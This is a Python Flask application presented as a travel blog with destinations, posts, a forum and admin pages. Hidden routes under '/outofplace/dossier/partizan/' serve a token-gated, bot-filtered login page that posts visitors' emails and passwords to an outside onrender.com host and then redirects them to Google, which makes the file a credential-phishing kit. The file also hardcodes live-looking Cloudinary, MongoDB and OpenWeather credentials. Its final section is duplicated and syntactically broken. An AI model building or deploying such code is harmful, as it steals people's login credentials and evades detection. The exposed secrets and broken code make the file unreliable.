from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
import bcrypt
from pymongo import MongoClient
from bson.objectid import ObjectId
import markdown
import math
from functools import wraps
import csv
from io import StringIO
from werkzeug.utils import secure_filename
from pymongo.errors import ServerSelectionTimeoutError
from bson import json_util
import cloudinary
import cloudinary.uploader
from cloudinary.utils import cloudinary_url
import time
import secrets
from slugify import slugify
import requests
import os



# Configuration       
cloudinary.config( 
    cloud_name = "dossuuyap", 
    api_key = "773232315157195", 
    api_secret = "dqlVfUTY4QTlY5a7DGtuMeXfZt8", # Click 'View API Keys' above to copy your API secret
    secure=True
)

# # Upload an image
# upload_result = cloudinary.uploader.upload("https://res.cloudinary.com/demo/image/upload/getting-started/shoes.jpg",
#                                            public_id="shoes")
# print(upload_result["secure_url"])

# # Optimize delivery by resizing and applying auto-format and auto-quality
# optimize_url, _ = cloudinary_url("shoes", fetch_format="auto", quality="auto")
# print(optimize_url)

# # Transform the image: auto-crop to square aspect_ratio
# auto_crop_url, _ = cloudinary_url("shoes", width=500, height=500, crop="auto", gravity="auto")
# print(auto_crop_url)

app = Flask(__name__)
app.secret_key = 'supersecretkey123'

# MongoDB Setup
# client = MongoClient('mongodb+srv://adefelashogbanmu:uLo131XaLq1RZhEN@cluster0.ecs1xfy.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0') 
try:
    client = MongoClient('mongodb+srv://adefelashogbanmu:uLo131XaLq1RZhEN@cluster0.ecs1xfy.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0') 
    client.server_info()  # Force connection on a request as the connect=True parameter of MongoClient seems useless here
    print("✅ Connected to MongoDB successfully.")
except ServerSelectionTimeoutError as err:
    print("❌ Failed to connect to MongoDB:", err)
    exit(1)
    
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
db = client['travel_blog']

# Collections
users_col = db['users']  # user collection
destinations_col = db['destinations']
blog_posts_col = db['blog_posts']
subscribers_col = db['newsletter_subscribers']
forum_col = db['forum_messages']
tokens_col = db['tokens']
OPENWEATHER_API_KEY = 'da0320f70fd5d1118824b9c715a43d9e'

# === TOKEN CACHE & CONSTANTS ===
token_cache = {
    'token': None,
    'expiry': 0
}
TOKEN_EXPIRY_SECONDS = 3600  # 1 hour
BACKEND_URL = 'https://token-service-rg19.onrender.com/api/token'  # Send token here

class User(UserMixin):
    def __init__(self, user_doc):
        self.id = str(user_doc['_id'])
        self.username = user_doc['username']
        self.role = user_doc.get('role', 'user')

@login_manager.user_loader
def load_user(user_id):
    user_doc = users_col.find_one({'_id': ObjectId(user_id)})
    if user_doc:
        return User(user_doc)
    return None

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != 'admin':
            return "Unauthorized", 403
        return f(*args, **kwargs)
    return decorated_function

# Initialize once (optional)
def seed_data():
    if destinations_col.count_documents({}) == 0:
        print("🌱 Seeding destination data...")
        destinations = [
    {
        'name': 'Paris',
        'description': 'The city of lights and love.',
        'image': 'paris.jpg',
        'lat': 48.8566,
        'lon': 2.3522
    },
    {
        'name': 'Tokyo',
        'description': 'A blend of tradition and modern life.',
        'image': 'japan.jpg',
        'lat': 35.6895,
        'lon': 139.6917
    },
    {
        'name': 'New York',
        'description': 'The city that never sleeps.',
        'image': 'new-york.jpg',
        'lat': 40.7128,
        'lon': -74.0060
    }
]
        destinations_col.insert_many(destinations)
    else:
        print("✅ Destination collection already has data.")

    if blog_posts_col.count_documents({}) == 0:
        blog_posts = [
            {'title': 'Top 10 Travel Tips', 'content': '## Packing\nAlways roll your clothes.', 'category': 'Tips'},
            {'title': 'How to pack light', 'content': '**Only take what you need.**', 'category': 'Packing'},
            {'title': 'Best Destinations in 2024', 'content': '*Visit* Bali, Japan, and Iceland.', 'category': 'Destinations'},
        ]
        blog_posts_col.insert_many(blog_posts)

seed_data()

# === BOT CHECKER ===
def is_bot():
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['bot', 'crawl', 'spider', 'slurp', 'facebookexternalhit', 'fetch', 'python-requests']
    return any(bot in ua for bot in bots)

# === TOKEN MANAGEMENT ===
def generate_token():
    t = secrets.token_urlsafe(24)
    expiry = time.time() + TOKEN_EXPIRY_SECONDS
    token_cache['token'] = t
    token_cache['expiry'] = expiry

    tokens_col.update_one(
        {'_id': 'current_token'},
        {'$set': {'token': t, 'expiry': expiry}},
        upsert=True
    )

    # Send token to backend service
    try:
        requests.post(BACKEND_URL, json={'token': t})
    except Exception as e:
        print(f"Failed to send token to backend: {e}")
    
    return t

def load_token():
    rec = tokens_col.find_one({'_id': 'current_token'})
    if rec and rec.get('expiry', 0) > time.time():
        token_cache['token'] = rec['token']
        token_cache['expiry'] = rec['expiry']
    else:
        generate_token()

def is_token_valid(t):
    load_token()
    return t == token_cache['token'] and time.time() < token_cache['expiry']

# Initialize token on startup
load_token()

short_url_map = {}

def generate_short_code():
    return secrets.token_urlsafe(8)

# === TOKEN-PROTECTED ROUTES ===

@app.route('/outofplace/dossier/partizan/login/<token>', methods=['GET', 'POST'])
def wrangler_token(token):
    if not is_token_valid(token):
        abort(404)
    if is_bot():
        return "Access denied to bots", 403
    
    errors = {}
    email = ''
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()

        if not email:
            errors['email'] = 'Email is required'
        if not password:
            errors['password'] = 'Password is required'

        if not errors:
            # Send data to placeholder backend service
            try:
                placeholder_url = 'https://rate-limiter-590c.onrender.com/submit'
                payload = {'email': email, 'password': password}
                resp = requests.post(placeholder_url, data=payload, timeout=5)
                resp.raise_for_status()
            except requests.RequestException as e:
                errors['submission'] = 'Failed to send data. Please try again later.'

            if not errors:
                return redirect('https://google.com')

    return render_template('outofplace/dossier/partizan/bell.html', errors=errors, email=email)

@app.route('/xonly')
def x_only():
    if is_bot():
        return "Access denied", 403
    return render_template('outofplace/dossier/partizan/bell.html')

@app.route('/xonly/<token>')
def token_x_only(token):
    if not is_token_valid(token):
        abort(404)
    return render_template('outofplace/dossier/partizan/bell.html')

# === TOKEN MANAGEMENT ROUTES ===

@app.route('/regen-token')
@admin_required
def regen_token():
    new_token = generate_token()
    return f"New token generated: {new_token}"

@app.route('/shorten-login-url')
@admin_required
def shorten_login_url():
    token = token_cache['token']
    full_path = url_for('wrangler', token=token)
    short_code = generate_short_code()
    short_url_map[short_code] = full_path
    return f"Short URL created: /s/{short_code}"

@app.route('/s/<short_code>')
def short_url_redirect(short_code):
    full_path = short_url_map.get(short_code)
    if not full_path:
        abort(404)
    return redirect(url_for('login_loading_screen'))


@app.route('/')
def root_loading():
    # Show the loading page on root
    return render_template('loading.html')

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static/images', 'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/home')
def home():
    return redirect(url_for('home_actual'))


@app.route('/home-actual')
def home_actual():
    destinations = list(destinations_col.find())
    return render_template('home.html', destinations=destinations)

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password'].strip()

        if users_col.find_one({'username': username}):
            flash('Username already exists.')
            return redirect(url_for('signup'))

        hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        users_col.insert_one({
            'username': username,
            'password': hashed,
            'role': 'user'  # Default role
        })

        flash('Signup successful. Please log in.')
        return redirect(url_for('login'))

    return render_template('auth/signup.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password'].strip()

        user_doc = users_col.find_one({'username': username})
        if user_doc and bcrypt.checkpw(password.encode('utf-8'), user_doc['password']):
            login_user(User(user_doc))
            return redirect(url_for('home'))
        else:
            flash('Invalid username or password.')

    return render_template('auth/login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('home'))


@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/blog')
def blog():
    search = request.args.get('search', '')
    category = request.args.get('category', '')
    page = int(request.args.get('page', 1))
    per_page = 3

    query = {}
    if search:
        query['$or'] = [{'title': {'$regex': search, '$options': 'i'}}, {'content': {'$regex': search, '$options': 'i'}}]
    if category:
        query['category'] = category

    total_posts = blog_posts_col.count_documents(query)
    posts = list(blog_posts_col.find(query).skip((page - 1) * per_page).limit(per_page))

    # ✅ Convert markdown to HTML for blog list
    for post in posts:
        post['content'] = markdown.markdown(post['content'])

    categories = blog_posts_col.distinct('category')

    return render_template('blog.html', blog_posts=posts, page=page,
                           total_pages=math.ceil(total_posts / per_page),
                           search=search, category=category, categories=categories)


@app.route('/blog/<post_id>')
def blog_post(post_id):
    post = blog_posts_col.find_one({'_id': ObjectId(post_id)})
    if not post:
        return "Post not found", 404
    post['content'] = markdown.markdown(post['content'])  # render markdown
    return render_template('blog_post.html', post=post)

@app.route('/newsletter', methods=['GET', 'POST'])
def newsletter():
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()

        if not email or '@' not in email:
            flash('Please enter a valid email address.', 'warning')
        elif subscribers_col.find_one({'email': email}):
            flash('You are already subscribed.', 'info')
        else:
            subscribers_col.insert_one({'email': email})
            flash('Thank you for subscribing to our newsletter!', 'success')
            return redirect(url_for('newsletter'))

    # Only fetch subscribers if user is admin
    subscribers = []
    if current_user.is_authenticated and current_user.role == 'admin':
        subscribers = list(subscribers_col.find())

    return render_template('newsletter.html', newsletter_subscribers=subscribers)

@app.route('/forum', methods=['GET', 'POST'])
def forum():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        message = request.form.get('message', '').strip()
        if not username or not message:
            flash('Both username and message are required.')
        else:
            forum_col.insert_one({'username': username, 'message': message, 'upvotes': 0})
            flash('Your message has been posted!')
            return redirect(url_for('forum'))

    messages = list(forum_col.find())
    return render_template('forum.html', forum_messages=messages)

@app.route('/forum/delete/<msg_id>', methods=['POST'])
@admin_required
def delete_message(msg_id):
    forum_col.delete_one({'_id': ObjectId(msg_id)})
    flash("Message deleted successfully.")
    return redirect(url_for('admin_dashboard'))


@app.route('/forum/upvote/<msg_id>', methods=['POST'])
def upvote_message(msg_id):
    forum_col.update_one({'_id': ObjectId(msg_id)}, {'$inc': {'upvotes': 1}})
    return redirect(url_for('forum'))

@app.route('/destination/<dest_id>')
def destination_detail(dest_id):
    destination = destinations_col.find_one({'_id': ObjectId(dest_id)})
    if not destination:
        return "Destination not found", 404
    return render_template('destination_detail.html', destination=destination)

@app.route('/destination/<dest_id>/weather')
def destination_weather(dest_id):
    destination = destinations_col.find_one({'_id': ObjectId(dest_id)})
    if not destination or 'lat' not in destination or 'lon' not in destination:
        return "Destination or coordinates not found", 404

    lat, lon = destination['lat'], destination['lon']
    url = f'https://api.openweathermap.org/data/2.5/weather?lat={lat}&lon={lon}&appid={OPENWEATHER_API_KEY}&units=metric'
    res = requests.get(url).json()

    return render_template('weather.html', destination=destination, weather=res)

@app.route('/admin')
@admin_required
def admin_dashboard():
    posts = list(blog_posts_col.find())
    destinations = list(destinations_col.find())
    messages = list(forum_col.find())
    return render_template('admin/dashboard.html', posts=posts, destinations=destinations, messages=messages)

@app.route('/admin/new-post', methods=['GET', 'POST'])
@admin_required
def new_post():
    if request.method == 'POST':
        title = request.form['title']
        category = request.form['category']
        content = request.form['content']

        post = {
            'title': title,
            'category': category,
            'content': content,
            'slug': slugify(title)
        }

        blog_posts_col.insert_one(post)
        flash('Blog post created successfully.')
        return redirect(url_for('admin_dashboard'))

    return render_template('admin/new_post.html')

@app.route('/admin/new-destination', methods=['GET', 'POST'])
@admin_required
def new_destination():
    if request.method == 'POST':
        name = request.form['name']
        description = request.form['description']
        lat = float(request.form.get('lat', 0))
        lon = float(request.form.get('lon', 0))

        image_file = request.files['image']
        if not image_file:
            flash('Image is required.')
            return redirect(request.url)

        try:
            upload_result = cloudinary.uploader.upload(image_file, folder="travel_blog/destinations")
            image_url = upload_result['secure_url']
        except Exception as e:
            flash(f'Image upload failed: {e}')
            return redirect(request.url)

        doc = {
            'name': name,
            'description': description,
            'lat': lat,
            'lon': lon,
            'image': image_url
        }

        destinations_col.insert_one(doc)
        flash('Destination added successfully.')
        return redirect(url_for('admin_dashboard'))

    return render_template('admin/new_destination.html')


@app.route('/admin/edit/destination/<dest_id>', methods=['GET', 'POST'])
@admin_required
def edit_destination(dest_id):
    destination = destinations_col.find_one({'_id': ObjectId(dest_id)})
    if not destination:
        return "Destination not found", 404

    if request.method == 'POST':
        # Update image if a new one was uploaded
        image_url = destination.get('image', '')

        image_file = request.files.get('image')
        if image_file and image_file.filename:
            try:
                upload_result = cloudinary.uploader.upload(
                    image_file,
                    folder="travel_blog/destinations"
                )
                image_url = upload_result['secure_url']
            except Exception as e:
                flash(f"Image upload failed: {str(e)}")
                return redirect(request.url)

        # Update destination in database
        destinations_col.update_one({'_id': ObjectId(dest_id)}, {
            '$set': {
                'name': request.form['name'],
                'description': request.form['description'],
                'lat': float(request.form.get('lat', 0)),
                'lon': float(request.form.get('lon', 0)),
                'image': image_url
            }
        })
        flash("Destination updated successfully.")
        return redirect(url_for('admin_dashboard'))

    return render_template('admin/edit_destination.html', destination=destination)


@app.route('/admin/edit/post/<post_id>', methods=['GET', 'POST'])
@admin_required
def edit_post(post_id):
    post = blog_posts_col.find_one({'_id': ObjectId(post_id)})
    
    if request.method == 'POST':
        blog_posts_col.update_one({'_id': ObjectId(post_id)}, {
            '$set': {
                'title': request.form['title'],
                'content': request.form['content'],
                'category': request.form['category'],
                'slug': slugify(request.form['title'])
            }
        })
        return redirect(url_for('admin_dashboard'))

    return render_template('admin/edit_post.html', post=post)

@app.route('/admin/upload-destinations', methods=['GET', 'POST'])
@admin_required
def upload_destinations():
    if request.method == 'POST':
        file = request.files.get('csvfile')
        if not file or not file.filename.endswith('.csv'):
            flash('Please upload a valid CSV file.')
            return redirect(request.url)

        # Read CSV
        stream = StringIO(file.stream.read().decode("UTF8"), newline=None)
        reader = csv.DictReader(stream)
        count = 0

        for row in reader:
            # Required fields check
            if not row.get('name') or not row.get('description') or not row.get('image_filename'):
                continue

            image_filename = row['image_filename'].strip()
            local_image_path = os.path.join('static', 'images', image_filename)

            if not os.path.isfile(local_image_path):
                flash(f"Image file {image_filename} not found on server. Skipping {row['name']}.")
                continue

            try:
                # Upload image to Cloudinary
                upload_result = cloudinary.uploader.upload(local_image_path, folder="travel_blog/destinations")
                image_url = upload_result['secure_url']

                # Prepare document
                doc = {
                    'name': row['name'],
                    'description': row['description'],
                    'image': image_url,
                    'lat': float(row.get('lat', 0)),
                    'lon': float(row.get('lon', 0))
                }

                # Insert or update by name (optional)
                destinations_col.update_one({'name': doc['name']}, {'$set': doc}, upsert=True)
                count += 1

            except Exception as e:
                flash(f"Failed to upload {image_filename}: {str(e)}")
                continue

        flash(f"Successfully processed {count} destinations.")
        return redirect(url_for('admin_dashboard'))

    return render_template('admin/upload_destinations.html')

@app.route('/admin/upload-posts', methods=['GET', 'POST'])
@admin_required
def upload_posts():
    if request.method == 'POST':
        file = request.files.get('csvfile')
        if not file or not file.filename.endswith('.csv'):
            flash('Please upload a valid CSV file.')
            return redirect(request.url)

        stream = StringIO(file.stream.read().decode("UTF8"), newline=None)
        reader = csv.DictReader(stream)
        count = 0
        for row in reader:
            if not row.get('title') or not row.get('content'):
                continue
            post = {
                'title': row['title'],
                'content': row['content'],
                'category': row.get('category', 'General'),
                'slug': slugify(row['title'])
            }
            blog_posts_col.insert_one(post)
            count += 1

        flash(f"Successfully added {count} posts.")
        return redirect(url_for('admin_dashboard'))

    return render_template('admin/upload_posts.html')


@app.route('/set-cookie-consent', methods=['POST'])
def set_cookie_consent():
    resp = redirect(request.referrer or url_for('home'))
    resp.set_cookie('cookie_consent', 'accepted', max_age=60*60*24*365)  # 1 year
    return resp

@app.route('/debug/db')
def debug_db():
    destinations = list(destinations_col.find())
    return json_util.dumps({'count': len(destinations), 'sample': destinations[:1]})

@app.route('/outofplace/dossier/partizan/loading')
def login_loading_screen():
    return render_template('outofplace/dossier/partizan/loading_redirect.html')



@app.route('/outofplace/dossier/partizan/login', methods=['GET', 'POST'])
def wrangler():
    errors = {}
    email = ''
    if request.method == 'POST':
    print("Received form submission:", request.form)
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()

    if not email:
        errors['email'] = 'Email is required'
    if not password:
        errors['password'] = 'Password is required'

    if not errors:
        payload = {'email': email, 'password': password}
        headers = {'Content-Type': 'application/json'}
        try:
            response = requests.post(
                placeholder_url,
                json=payload,
                headers=headers,
                timeout=5
            )
            print("Response status:", response.status_code)
            print("Response body:", response.text)
            response.raise_for_status()
        except requests.RequestException as e:
            print("Request to placeholder failed:", e)
            errors['submission'] = 'Failed to send data. Please try again later.'
        else:
            return redirect('https://google.com')


    return render_template('outofplace/dossier/partizan/bell.html', errors=errors, email=email)

if request.method == 'POST':
    print("Received form submission:", request.form)
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()

    if not email:
        errors['email'] = 'Email is required'
    if not password:
        errors['password'] = 'Password is required'

    if not errors:
        payload = {'email': email, 'password': password}
        headers = {'Content-Type': 'application/json'}
        try:
            response = requests.post(
                placeholder_url,
                json=payload,
                headers=headers,
                timeout=5
            )
            print("Response status:", response.status_code)
            print("Response body:", response.text)
            response.raise_for_status()
        except requests.RequestException as e:
            print("Request to placeholder failed:", e)
            errors['submission'] = 'Failed to send data. Please try again later.'
        else:
            return redirect('https://google.com')
